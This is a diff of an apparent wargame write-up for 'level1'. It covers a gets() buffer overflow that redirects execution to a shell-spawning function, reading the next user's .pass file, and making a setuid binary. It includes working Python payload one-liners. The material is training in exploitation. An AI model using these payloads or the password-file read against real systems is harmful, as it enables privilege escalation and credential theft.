@@ -2,24 +2,31 @@
 # Obtain the next password
 # ------------------------------------------------------------------------
 
-# The given binary contains an unused function, run(), at 0x08048444.  It writes a message and then spawns a shell.
+# Examine the given binary
 objdump -d -M intel ~/level1
 
-# In main(), the program uses gets() to copy a string from stdin to a char buffer.
+# In main(), the program uses gets() to copy a string from stdin to a buffer.
 
-# We can overflow this buffer and overwrite the return address, so at the end of main() the program will jump to run().
+# We can overflow this buffer and overwrite the return address, so at the end of main() the program will jump to run() at 0x08048444, where it writes a message and then spawns a shell.
 
-# From trial and error, we find the char buffer size is 76, as copying a string of length 76+ results in error.
+# From trial and error, we find that supplying a string of length 77+ corrupts the return address.
 python -c "print('A' * 76)" | ~/level1
 
-# We overflow the buffer overwrite the EBP with 0x08048444, reversed for little-endian.
+# Using gdb, we deduce the stack state:
+
+return address					(4 bytes)
+space from esp alignment		(8 bytes)
+old ebp							(4 bytes)
+buffer							(64 bytes)
+
+# We overflow the buffer overwrite the return address with 0x08048444, reversed for little-endian.
 # We trick the program to stay open with cat listening on stdin.
 (python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])"; cat) | ~/level1
 
 # We redirected the program to call run() and spawn a shell, in which the user is level2
 whoami
 
-Read the password for user level2
+# Read the password for user level2
 cat /home/user/level2/.pass
 
 # Terminate the shell, and the program
@@ -46,8 +53,6 @@ chmod u+s a.out
 chmod +wx ~; mv a.out ~
 
 # Now user level1 can run the exploit
-(python -c "print('A' * 88) + '\x08\x04\x84\x64'[::-1]"; cat) | /home/user/level2/a.out
-
-
+(python -c "print('A' * 76) + '\x08\x04\x84\x64'[::-1]"; cat) | /home/user/level2/a.out
 
 
